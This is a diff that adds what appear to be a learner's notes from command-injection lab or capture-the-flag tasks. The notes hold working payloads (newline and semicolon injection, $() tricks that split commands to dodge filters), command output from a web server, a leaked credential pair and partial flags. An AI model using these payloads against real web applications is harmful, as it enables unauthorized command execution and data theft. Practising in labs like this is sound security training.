@@ -1,0 +1,63 @@
+CMDI
+
+task 22
+
+; id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+; pwd
+/var/www/html
+
+; ls -la
+total 16
+drwxr-xr-x 1 root root 4096 Nov 21  2019 .
+drwxr-xr-x 1 root root 4096 Nov 13  2019 ..
+-rw-r--r-- 1 root root   24 Nov 21  2019 flag
+-rw-r--r-- 1 root root  548 Nov 21  2019 index.php
+
+; cat flag
+
+task 23
+
+%0Aid
+burp:  /index.php?ip=%0Agrep%20-rnF%20%27..%27%20-e%20%27cdb%27 
+
+
+grep -rnF ".." -e "cdb{"
+
+task 24
+
+fuzzing dirsearch:
+
+http://10.8.32.1:42791/passwords.txt
+
+lovely_monkey_1337:ashley_lovely_tigger_31337
+
+
+cdb{g00d_5t4rt_
+http://10.8.32.1:42791/cfd79cf4bc28c485fbec40d21d34dd9f/documents.php
+
+first, use %0A :
+
+GET /cfd79cf4bc28c485fbec40d21d34dd9f/documents.php?emp=%0Aid HTTP/1.1
+
+then use $() to brake up ls and la
+
+emp=%0Al$()s%20-l$()a 
+
+find a hidden file .3272dd7840718d7053771e3382082eb7 and read it emp=%0Aca$()t%20.3272dd7840718d7053771e3382082eb7
+
+exam :
+
+cmd=%2Fload %0Al$()s%20-l$()a 
+cmd=%2Fload %0Afind .. -maxdepth 1
+.
+./index.php
+cmd=%2Fload %0Ap$()wd
+/var/www/html/920734341552493d3bb3370f81ac24d2
+
+https://yolospacehacker.com/hackersguide/?cat=cmdinjection
+%0Ac$()at<index.php
+
+
+
